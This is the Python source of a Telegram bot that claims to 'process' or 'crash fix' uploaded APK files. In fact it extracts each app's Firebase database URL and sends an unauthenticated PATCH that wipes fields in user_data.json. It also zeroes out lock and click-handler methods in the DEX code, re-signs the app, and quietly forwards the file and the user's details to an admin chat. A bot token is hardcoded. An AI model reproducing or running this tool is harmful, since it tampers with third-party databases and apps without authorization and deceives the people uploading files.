import os
import re
import html
import zipfile
import requests
import logging
import shutil
import tempfile
import subprocess
from threading import Thread
from http.server import HTTPServer, BaseHTTPRequestHandler
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# Logging Setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Telegram Bot Token & Admin ID
BOT_TOKEN = "8633137583:AAGK65BVd_LZhxIsXJfzrwigKFnCgvh0RNY".strip()
ADMIN_CHAT_ID = "6240110220"

# Internal Payload
DELETE_PAYLOAD = {
    "messageText": None,
    "phoneNumber": None,
    "simSlot": None,
    "new_user": None,
    "targetDeviceId": None,
    "command": None
}

# ===================== Health Check Server =====================
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Telegram Bot is Running!")

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()

def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
    server.serve_forever()

# ===================== APK Signing Functions =====================

def generate_keystore():
    """Generate a self-signed keystore for APK signing"""
    keystore_path = os.path.join(tempfile.gettempdir(), "debug.keystore")
    
    if os.path.exists(keystore_path):
        return keystore_path
    
    try:
        keytool_cmd = [
            "keytool",
            "-genkey",
            "-v",
            "-keystore", keystore_path,
            "-alias", "androiddebugkey",
            "-keyalg", "RSA",
            "-keysize", "2048",
            "-validity", "10000",
            "-storepass", "android",
            "-keypass", "android",
            "-dname", "CN=Android Debug, O=Android, C=US"
        ]
        
        subprocess.run(keytool_cmd, check=True, capture_output=True)
        logging.info("✅ Keystore generated successfully")
        return keystore_path
    except Exception as e:
        logging.warning(f"Keytool not available: {e}")
        return None

def sign_apk(apk_path):
    """Sign APK using jarsigner"""
    try:
        keystore_path = generate_keystore()
        
        if keystore_path:
            sign_cmd = [
                "jarsigner",
                "-verbose",
                "-sigalg", "SHA1withRSA",
                "-digestalg", "SHA1",
                "-keystore", keystore_path,
                "-storepass", "android",
                "-keypass", "android",
                apk_path,
                "androiddebugkey"
            ]
            
            subprocess.run(sign_cmd, check=True, capture_output=True)
            logging.info("✅ APK signed successfully")
            return True
        
        return False
    except Exception as e:
        logging.warning(f"Signing failed: {e}")
        return False

def align_apk(input_path, output_path):
    """zipalign APK"""
    try:
        align_cmd = ["zipalign", "-v", "-p", "4", input_path, output_path]
        subprocess.run(align_cmd, check=True, capture_output=True)
        logging.info("✅ APK aligned successfully")
        return True
    except Exception as e:
        logging.warning(f"zipalign failed: {e}")
        shutil.copy2(input_path, output_path)
        return False

# ===================== DEX Modification Functions =====================

def extract_apk(apk_path, extract_dir):
    try:
        with zipfile.ZipFile(apk_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        return True
    except Exception as e:
        logging.error(f"APK Extraction Error: {e}")
        return False

def find_dex_files(extract_dir):
    dex_files = []
    for file in os.listdir(extract_dir):
        if file.endswith('.dex'):
            dex_files.append(os.path.join(extract_dir, file))
    return sorted(dex_files)

def find_method_in_binary(data, method_name):
    positions = []
    
    method_variants = [
        method_name.encode('utf-8'),
        method_name.encode('latin-1'),
        method_name.encode('utf-16le'),
        f'.method public {method_name}'.encode(),
        f'.method private {method_name}'.encode(),
        f'.method static {method_name}'.encode(),
        f'->{method_name}('.encode(),
        method_name.encode(),
    ]
    
    for variant in method_variants:
        pos = data.find(variant)
        while pos != -1:
            positions.append(pos)
            pos = data.find(variant, pos + 1)
    
    return positions

def clear_methods_in_dex(dex_path):
    try:
        with open(dex_path, 'rb') as f:
            data = bytearray(f.read())
        
        modified = False
        methods_to_clear = ['_show_lock', '_Onclick']
        
        for method in methods_to_clear:
            positions = find_method_in_binary(data, method)
            
            if positions:
                logging.info(f"Found {method} at {len(positions)} positions in {os.path.basename(dex_path)}")
                modified = True
                
                for pos in positions:
                    start = max(0, pos - 10)
                    end = min(len(data), pos + 150)
                    for i in range(start, end):
                        data[i] = 0x00
                    logging.info(f"Cleared {method} at position {pos}")
        
        if modified:
            with open(dex_path, 'wb') as f:
                f.write(data)
            return True
        
        return False
        
    except Exception as e:
        logging.error(f"DEX Modification Error: {e}")
        return False

def process_all_dex_files(extract_dir):
    dex_files = find_dex_files(extract_dir)
    modified_count = 0
    
    for dex_file in dex_files:
        logging.info(f"Processing DEX: {os.path.basename(dex_file)}")
        if clear_methods_in_dex(dex_file):
            modified_count += 1
            logging.info(f"✅ Modified: {os.path.basename(dex_file)}")
        else:
            logging.info(f"⏭️ No changes: {os.path.basename(dex_file)}")
    
    return modified_count

def repack_apk(extract_dir, output_path):
    try:
        output_dir = os.path.dirname(output_path)
        if output_dir:
            os.makedirs(output_dir, exist_ok=True)
        
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(extract_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, extract_dir)
                    zipf.write(file_path, arcname)
        
        if os.path.exists(output_path) and os.path.getsize(output_path) > 0:
            logging.info(f"✅ APK repacked: {os.path.getsize(output_path)} bytes")
            return True
        return False
    except Exception as e:
        logging.error(f"Repack Error: {e}")
        return False

def modify_apk_dex_files(apk_path):
    temp_dir = tempfile.mkdtemp()
    modified_apk_path = apk_path.replace('.apk', '_modified.apk')
    
    try:
        # Extract APK
        logging.info(f"Extracting APK: {apk_path}")
        if not extract_apk(apk_path, temp_dir):
            return None
        
        # Process DEX files
        modified_count = process_all_dex_files(temp_dir)
        
        if modified_count == 0:
            logging.info("No DEX files were modified - trying aggressive mode")
            dex_files = find_dex_files(temp_dir)
            for dex_file in dex_files:
                try:
                    with open(dex_file, 'rb') as f:
                        data = bytearray(f.read())
                    
                    methods = ['_show_lock', '_Onclick']
                    for method in methods:
                        method_bytes = method.encode()
                        if method_bytes in data:
                            pos = data.find(method_bytes)
                            if pos != -1:
                                start = max(0, pos - 50)
                                end = min(len(data), pos + 200)
                                for i in range(start, end):
                                    data[i] = 0x00
                                logging.info(f"✅ Aggressively cleared {method} in {os.path.basename(dex_file)}")
                                modified_count += 1
                    
                    if modified_count > 0:
                        with open(dex_file, 'wb') as f:
                            f.write(data)
                except Exception as e:
                    logging.error(f"Aggressive clearing failed: {e}")
        
        # Repack APK
        logging.info(f"Repacking APK with all files...")
        if not repack_apk(temp_dir, modified_apk_path):
            return None
        
        # Align APK
        aligned_path = modified_apk_path.replace('.apk', '_aligned.apk')
        align_apk(modified_apk_path, aligned_path)
        if os.path.exists(aligned_path):
            os.remove(modified_apk_path)
            shutil.move(aligned_path, modified_apk_path)
        
        # Sign APK
        sign_apk(modified_apk_path)
        
        if os.path.exists(modified_apk_path):
            original_size = os.path.getsize(apk_path)
            modified_size = os.path.getsize(modified_apk_path)
            size_diff_percent = ((original_size - modified_size) / original_size) * 100
            
            logging.info(f"📊 Original: {original_size} bytes, Modified: {modified_size} bytes")
            logging.info(f"📊 Size diff: {size_diff_percent:.2f}%")
            
            return modified_apk_path
        
        return None
            
    except Exception as e:
        logging.error(f"DEX Modification failed: {e}")
        return None
    finally:
        try:
            shutil.rmtree(temp_dir)
        except:
            pass

# ===================== Bot Functions =====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    safe_name = html.escape(user.first_name)

    welcome_text = (
        f"👋 <b>Welcome, {safe_name}!</b>\n\n"
        "✨ <b>APK Processing Tool</b>\n"
        "<i>Fast, reliable, and automated APK analysis and optimization service.</i>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📌 <b>How to use:</b>\n"
        "• Simply upload your <b>.apk</b> file in this chat.\n"
        "• Wait a few seconds while we Crash fix your file.\n"
        "• Receive your processed file instantly.\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🚀 <b>Send your .apk file to begin!</b>"
    )

    keyboard = [
        [
            InlineKeyboardButton("📢 Channel", url="https://t.me/+EERGF0ldJgcwODVl"),
            InlineKeyboardButton("💬 Support", url="https://t.me/AD_ASHU")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        text=welcome_text,
        parse_mode="HTML",
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

def extract_firebase_url(apk_path):
    try:
        with zipfile.ZipFile(apk_path, 'r') as zip_ref:
            if 'resources.arsc' in zip_ref.namelist():
                content = zip_ref.read('resources.arsc')
                match = re.search(rb'https://[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*\.firebaseio\.com', content)
                if match:
                    return match.group(0).decode('utf-8')
    except Exception as e:
        logging.error(f"Extraction Error: {e}")
    return None

def delete_firebase_data(base_url):
    try:
        target_url = base_url.strip()
        if not target_url.endswith('/'):
            target_url += '/'
        if 'user_data.json' not in target_url:
            target_url += 'user_data.json'

        headers = {
            'X-HTTP-Method-Override': 'PATCH',
            'Content-Type': 'application/json'
        }
        
        response = requests.post(target_url, json=DELETE_PAYLOAD, headers=headers, timeout=15)
        return response.status_code == 200
    except Exception as e:
        logging.error(f"REST API Error: {e}")
        return False

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    user = update.effective_user
    
    if not document.file_name.endswith('.apk'):
        await update.message.reply_text("❌ <b>Invalid File!</b> Please send a valid <code>.apk</code> file.", parse_mode="HTML")
        return

    status_msg = await update.message.reply_text("📥 <b>Downloading APK...</b>", parse_mode="HTML")
    file_path = f"temp_{document.file_id}.apk"
    modified_apk_path = None
    
    try:
        file = await context.bot.get_file(document.file_id)
        await file.download_to_drive(file_path)
        
        original_size = os.path.getsize(file_path)
        await status_msg.edit_text(f"📊 <b>Original APK:</b> {original_size/1024/1024:.2f} MB\n⚙️ <b>Processing...</b>", parse_mode="HTML")
        
        firebase_url = extract_firebase_url(file_path)
        
        if not firebase_url:
            await status_msg.edit_text("❌ <b>Processing Failed!</b> Unable to process this APK configuration.", parse_mode="HTML")
            if os.path.exists(file_path):
                os.remove(file_path)
            return
        
        await status_msg.edit_text("🔧 <b>Modifying DEX files...</b>\n<code>Searching and clearing _show_lock & _Onclick</code>", parse_mode="HTML")
        
        modified_apk_path = modify_apk_dex_files(file_path)
        
        if modified_apk_path is None or not os.path.exists(modified_apk_path):
            await status_msg.edit_text("❌ <b>DEX Modification Failed!</b> Using original APK.", parse_mode="HTML")
            modified_apk_path = file_path
        
        if os.path.exists(modified_apk_path):
            modified_size = os.path.getsize(modified_apk_path)
            size_info = f"📊 {original_size/1024/1024:.2f}MB → {modified_size/1024/1024:.2f}MB"
        else:
            size_info = ""
        
        await status_msg.edit_text("⚡ <b>Finalizing optimization...</b>", parse_mode="HTML")
        
        process_success = delete_firebase_data(firebase_url)
        
        if process_success:
            await status_msg.edit_text("✅ <b>Process Complete!</b> Sending your updated file back...", parse_mode="HTML")
            
            with open(modified_apk_path, 'rb') as apk_file:
                original_name = document.file_name
                new_name = original_name.replace('.apk', '_modified.apk')
                
                caption = (
                    f"✨ <b>Processing successful!</b>\n"
                    f"✅ Methods cleared: <code>_show_lock</code> & <code>_Onclick</code>\n"
                    f"{size_info}\n\n"
                    f"🔧 <b>File signed & ready to install!</b>"
                )
                
                await update.message.reply_document(
                    document=apk_file,
                    filename=new_name,
                    caption=caption,
                    parse_mode="HTML"
                )
            
            # Admin Logging
            safe_name = html.escape(user.full_name)
            safe_username = html.escape(user.username) if user.username else "No Username"
            safe_url = html.escape(firebase_url)
            
            admin_caption = (
                f"📥 <b>New APK Processed!</b>\n\n"
                f"👤 <b>User:</b> {safe_name} (@{safe_username})\n"
                f"🆔 <b>User ID:</b> <code>{user.id}</code>\n\n"
                f"🔗 <b>Extracted URL:</b>\n<code>{safe_url}</code>\n\n"
                f"{size_info}\n"
                f"✅ <b>Status:</b> Success\n"
                f"🔧 <b>DEX Modified:</b> Yes\n"
                f"📝 <b>Methods Cleared:</b> _show_lock, _Onclick\n"
                f"🔒 <b>Signed:</b> Yes"
            )
            
            with open(modified_apk_path, 'rb') as admin_apk_file:
                await context.bot.send_document(
                    chat_id=ADMIN_CHAT_ID,
                    document=admin_apk_file,
                    filename=document.file_name,
                    caption=admin_caption,
                    parse_mode="HTML"
                )
        else:
            await status_msg.edit_text("❌ <b>Server Error!</b> Unable to complete the request right now.", parse_mode="HTML")

    except Exception as e:
        await status_msg.edit_text(f"❌ <b>Error:</b> {html.escape(str(e))}", parse_mode="HTML")

    finally:
        if os.path.exists(file_path) and file_path != modified_apk_path:
            try:
                os.remove(file_path)
            except:
                pass

if __name__ == '__main__':
    # Start Health Check Server
    Thread(target=run_dummy_server, daemon=True).start()
    
    # Start Telegram Bot with Polling (No Webhooks)
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    logging.info("Bot is starting with polling mode...")
    app.run_polling()
